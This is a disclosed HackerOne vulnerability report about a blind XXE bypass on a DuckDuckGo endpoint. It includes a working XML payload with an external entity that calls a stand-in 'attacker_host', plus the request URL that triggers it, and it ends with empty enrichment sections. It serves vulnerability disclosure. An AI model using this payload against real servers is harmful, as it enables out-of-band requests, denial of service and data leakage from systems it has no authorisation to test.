---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '486732'
original_report_id: '486732'
title: 'Partial bypass of #483774 with Blind XXE on https://duckduckgo.com'
weakness: XML External Entities (XXE)
team_handle: duckduckgo
created_at: '2019-01-26T19:30:34.188Z'
disclosed_at: '2019-02-25T16:42:25.787Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 151
asset_identifier: '*.duckduckgo.com'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- xml-external-entities-xxe
---

# Partial bypass of #483774 with Blind XXE on https://duckduckgo.com

## Metadata

- HackerOne Report ID: 486732
- Weakness: XML External Entities (XXE)
- Program: duckduckgo
- Disclosed At: 2019-02-25T16:42:25.787Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

**Summary:**
Hi DuckDuckGo team,
I've contacted previously you because in a second time (on the #483774 report), I've seen that was possible bypass the fix. Anyway, I've not got any response, and because I think that this is a bit dangerous issue, I'm opening another report for the bypass. Hope you'll agree.

**Steps for reproduction:**
1. Attacker creates a public server and hosts a file with the following content:

```xml
<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://attacker_host/Blind_xxe"> %ext;
]>
<r></r>
```
2. User goes on https://duckduckgo.com/x.js?u=http://attacker_host/xxe.xml
3. The `http://attacker_host/Blind_xxe` resource will be requested by an host {F413045}

I'd like to say that this affects not only `duckduckgo.com`, but also `api.duckduckgo.com`. Anyway, the #483908 report is still in the `triaged` state, so I think that will not be right against you submit another report also for the `api.duckduckgo.com` domain.

## Impact

Blind XXE leads to `dos` and `blind injection`.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
